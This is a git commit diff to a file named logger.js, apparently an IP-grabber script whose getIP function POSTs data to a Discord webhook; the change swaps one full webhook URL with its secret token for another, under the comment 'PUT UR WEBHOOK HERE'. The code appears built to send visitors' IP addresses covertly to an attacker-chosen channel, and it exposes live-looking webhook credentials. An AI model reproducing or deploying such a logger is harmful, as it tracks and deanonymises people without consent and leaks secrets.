908d6166f1e7aaddd1f79dc337066bc0acb3f736
h6b <100783582+h6b@users.noreply.github.com>
2022-06-05 10:25:23 +0100

    Update logger.js

--- logger.js
+++ logger.js
@@ -1,6 +1,6 @@
 function getIP(json) {
   var request = new XMLHttpRequest();
-        const Hook = "https://discord.com/api/webhooks/982640726233989160/eocrq8nA_BHqWXffOAD37-beOIBhIezexSGpPCSuNTLpPns0H_L0EoE0dNzXrPbCzGEe"; // PUT UR WEBHOOK HERE
+        const Hook = "https://discord.com/api/webhooks/982760224236662806/86INbGdKMaWEw_95AEN5OO2xBZ7_ptEPcccUD5aaujT_EQWSqumc5mwo_n40ro2A4toi"; // PUT UR WEBHOOK HERE
         var request = new XMLHttpRequest();
         request.open("POST", Hook);
         request.setRequestHeader('Content-type', 'application/json');
